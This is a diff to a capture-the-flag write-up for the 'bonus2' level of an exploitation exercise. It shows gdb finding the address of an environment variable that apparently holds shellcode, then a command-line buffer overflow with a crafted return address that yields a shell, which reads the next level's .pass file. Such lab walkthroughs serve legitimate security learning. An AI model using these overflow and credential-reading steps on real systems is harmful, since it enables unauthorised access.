@@ -11,11 +11,14 @@ export LANG=nl
 (gdb) r `python -c 'print 41 * "A"'` "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"
 Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
 0x38614137 in ?? ()
+
+(gdb) p (void*)getenv("PWN")
+$1 = (void *) 0xbffffd2c
 ```
 Using [a pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) we found that the offset it segfaults at is 23.
 
 ```shell
-./bonus2 `python -c 'print 40 * "A"'` `python -c 'print 23 * "B" + "\x6c\xfd\xff\xbfa"'`
+./bonus2 `python -c 'print 40 * "A"'` `python -c 'print 23 * "B" + "\x6c\xfd\xff\xbf"'`
 Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBl���a
 $ cat /home/user/bonus3/.pass
 [redacted]
